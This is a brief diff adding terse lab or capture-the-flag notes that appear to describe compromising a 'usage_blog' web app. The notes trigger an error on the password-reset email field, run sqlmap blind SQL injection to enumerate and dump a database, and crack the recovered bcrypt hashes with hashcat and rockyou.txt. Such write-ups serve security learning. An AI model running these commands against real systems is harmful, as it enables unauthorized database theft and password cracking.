@@ -1,0 +1,8 @@
+Register & login
+Go to Reset password section:
+E-Mail Address: <email>' -> 500 error
+burpsuite: copy request
+sqlmap -r <request> -p email --level 5 --risk 3 --technique=B --batch -> sql injection found
+sqlmap -r <request> -p email --level 5 --risk 3 --technique=B --batch --dbs --threads 10 -> dump: available databases - information schema, performance_schema, usage_blog
+sqlmap -r <request> -p email --level 5 --risk 3 --technique=B --batch --dump usage_blog --threads 10 (-T <tablename>) -> dump: data in table -> hash
+hashcat: bcrypt(-m 3200), rockyou.txt
